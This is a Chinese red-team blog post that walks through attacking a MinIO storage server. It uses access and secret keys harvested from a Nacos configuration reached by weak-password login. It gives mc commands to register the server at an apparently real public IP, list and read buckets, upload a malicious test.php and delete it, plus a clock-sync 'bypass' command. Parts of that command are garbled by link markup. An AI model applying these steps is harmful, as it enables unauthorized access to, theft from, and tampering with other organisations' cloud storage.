---
title: 【Minio】云存储服务接口攻击技巧
date: 2025-10-15
categories:
  - 红队
image: images/95.webp
---
# 0x00 介绍
Minio是一款高性能的对象存储服务，支持Amazon S3云存储服务接口。
# 0x01 攻击条件
当我们挖掘nacos漏洞时，使用弱口令进入到系统后，这里会有很多配置文件，这些配置文件会记录一些敏感信息。
敏感信息如下：
```
rabbit
redis
mysql
minio
ak/sk
```
# 0x02 条件
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015164434.png)

# 0x03 利用
如何利用起来呢？
这里就说一下minio怎么进行攻击利用。
首先我们需要先安装一下mc工具
这里我直接使用kali进行安装
```bash
wget https://dl.min.io/client/mc/release/linux-amd64/mc
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015160937.png)
赋予执行权限并移动到系统路径
```bash
chmod +x mc          # 赋予可执行权限
sudo mv mc /usr/local/bin/  # 移动到系统 PATH 路径，方便全局调用
```
验证安装
```bash
mc --version
# 示例输出：mc version RELEASE.2024-05-08T17-11-57Z (commit-id=...)
```
安装完成后，即可在 Kali 终端中执行你提供的命令：
```
mc alias set my-minio http://125.34.90.154:9000 PWjVFMxxxxkakthh Lm4I01IQd5OX1xxxxx45UlascuH
```
这条命令怎么来的呢？
```php
set my-minio：设置一个名字
http://125.34.90.154:9000：路径
PWjVFxxxMkakthh：access-key
Lm4I01IQd5OXxxxscuH：secret-key
```
这里可以看到nacos里的配置：
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015162657.png)
如果所有配置正常这里会回显成功。
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015162848.png)
如果配置错误这里也会显示错误提示。
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015162911.png)
看一下这个里面有什么文件，可以看到这里有4个文件夹。
```
mc ls my-minio/
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015162954.png)
然后我们先看第一个文件夹里面有什么数据：
```
mc ls my-minio/solicitation
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015163102.png)
然后再随便跟一个文件夹，看一下有什么东西没：
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015163147.png)
可以看到有一个1.png文件。
然后直接访问这个路径，记得把my-minio删掉，发现可以直接显示图片。
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015163244.png)
然后我们尝试是否能文件上传到桶里面：
首先创建一个文件。
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015163414.png)
上传恶意文件
这里你可以随便上传到哪里，反正有目录了。
```
mc cp test.php my-minio/solicitation/
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015163558.png)
可以看到已经上传成功了。
访问一下这个路径，
```
solicitation/test.php
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015163649.png)
发现直接下载，并没有解析。
删除
```
mc rm --force test.php
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015163856.png)
# 0x04 绕过技巧
```
SERVER_TIME=$(curl -s -I "[http://127.0.0.1:9000"](http://125.34.90.154:9000/") | grep -i "date:" | cut -d':' -f2- | sed 's/^ *//'); sudo date -s "$SERVER_TIME" && ./mc ls my-minio/solicitation
这个命令主要是绕过/mc ls my-minio/solicitation可以在这个地方添加命令。
如果你仔细的情况下可以观察到：SERVER_TIME=$(curl -s -I "[http://127.0.0.1:9000"](http://125.34.90.154:9000/") | grep -i "date:" | cut -d':' -f2- | sed 's/^ *//'); sudo date -s "$SERVER_TIME" 前面无论如何都是这种命令，因为帮助我们绕过，后面只需跟&& 然后mc基础命令即可。
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015164235.png)
